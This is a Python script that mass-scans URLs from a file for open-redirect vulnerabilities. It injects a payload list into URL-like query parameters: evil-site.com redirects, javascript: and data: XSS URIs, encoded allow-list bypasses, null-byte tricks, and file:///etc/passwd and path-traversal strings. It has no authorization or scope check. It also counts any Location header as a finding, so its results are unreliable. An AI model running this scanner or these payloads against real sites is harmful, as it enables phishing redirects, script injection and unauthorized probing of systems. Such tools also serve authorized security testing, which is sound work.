import requests
import urllib.parse
from urllib.parse import urlparse, parse_qs

# List of payloads to test
PAYLOADS = [
    # Absolute URLs
    "https://evil-site.com",
    "http://malicious-site.com",

    # Relative URLs
    "/path/to/resource",
    "../vulnerable-page",
    "./internal-page",

    # JavaScript URIs
    "javascript:alert('XSS')",
    "javascript:void(0)",
    "javascript:document.location='https://evil-site.com'",

    # Data URIs
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",

    # Encoded URLs
    "%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2D%73%69%74%65%2E%63%6F%6D",  # https://evil-site.com
    "%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29",  # javascript:alert('XSS')

    # Protocol Handlers
    "mailto:user@example.com",
    "tel:+1234567890",
    "file:///etc/passwd",

    # Double Slashes
    "//evil-site.com",
    "//subdomain.evil-site.com/path",

    # Null Byte Injection
    "https://evil-site.com%00",
    "https://legit-site.com%00.evil-site.com",

    # Path Traversal
    "../../../../etc/passwd",
    "../admin-panel",

    # Whitelisted Domains
    "https://trusted-domain.com.evil-site.com",
    "https://trusted-domain.com@evil-site.com",
    "https://trusted-domain.com?evil-site.com",

    # Base64-Encoded Redirects
    "aHR0cHM6Ly9ldmlsLXNpdGUuY29t",  # Base64-encoded https://evil-site.com

    # Query Parameters
    "https://legit-site.com?redirect=https://evil-site.com",

    # Fragment Identifiers
    "https://legit-site.com#https://evil-site.com"
]


# Function to check if a string looks like a URL
def is_url_like(value):
    try:
        result = urlparse(value)
        return all([result.scheme, result.netloc])  # Check if scheme and netloc are present
    except Exception:
        return False


# Function to test for open redirects
def test_open_redirect(base_url, param, payloads):
    print(f"[+] Testing open redirect vulnerability on {base_url} with parameter '{param}'...")
    found_redirects = []  # Store successful findings

    for payload in payloads:
        try:
            # Construct the test URL by replacing the original value with the payload
            parsed_url = urlparse(base_url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = payload  # Replace the parameter value with the payload

            # Rebuild the URL with the modified query parameters
            modified_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"

            # Send a GET request to the test URL
            response = requests.get(test_url, allow_redirects=False, timeout=10)

            # Check the response headers for a redirect
            if "Location" in response.headers:
                location = response.headers["Location"]
                print(f"[+] Open Redirect Found! Payload: {payload} -> Redirects to: {location}")
                found_redirects.append((payload, location))  # Save the finding
            else:
                print(f"[-] No Redirect for Payload: {payload}")
        except Exception as e:
            print(f"[!] Error testing payload {payload}: {e}")

    return found_redirects


# Function to log successful findings to a file (only if there are findings)
def log_findings(findings, output_file):
    if findings:
        try:
            with open(output_file, "w") as f:  # Create the file only if there are findings
                for payload, location in findings:
                    f.write(f"URL: {payload}, Redirects to: {location}\n")
            print(f"[+] Successful findings logged to {output_file}")
        except Exception as e:
            print(f"[!] Error writing to file {output_file}: {e}")
    else:
        print("[+] No open redirect vulnerabilities found. No log file created.")


# Main function for mass testing
def mass_test(file_path, payloads):
    try:
        with open(file_path, "r") as f:
            urls = [line.strip() for line in f if line.strip()]  # Read URLs from file
    except FileNotFoundError:
        print(f"[!] Input file '{file_path}' not found.")
        return
    except PermissionError:
        print(f"[!] Permission denied while accessing '{file_path}'.")
        return

    all_findings = []  # Store findings from all URLs
    for url in urls:
        print(f"\n[+] Starting tests for URL: {url}")

        # Parse the URL and extract query parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        if not query_params:
            print(f"[-] No query parameters found in {url}. Skipping...")
            continue

        # Identify URL-like parameters
        url_like_params = [param for param, values in query_params.items() if
                           any(is_url_like(value) for value in values)]

        if not url_like_params:
            print(f"[-] No URL-like parameters found in {url}. Skipping...")
            continue

        # Test each URL-like parameter
        for param in url_like_params:
            findings = test_open_redirect(url, param, payloads)
            all_findings.extend(findings)

    # Log all findings to a file (if any)
    log_findings(all_findings, "open_redirects_found.txt")


# Run the script
if __name__ == "__main__":
    # Prompt the user for the input file path
    URL_FILE = input("Enter the path to the file containing URLs to test: ").strip()

    # Start mass testing
    mass_test(URL_FILE, PAYLOADS)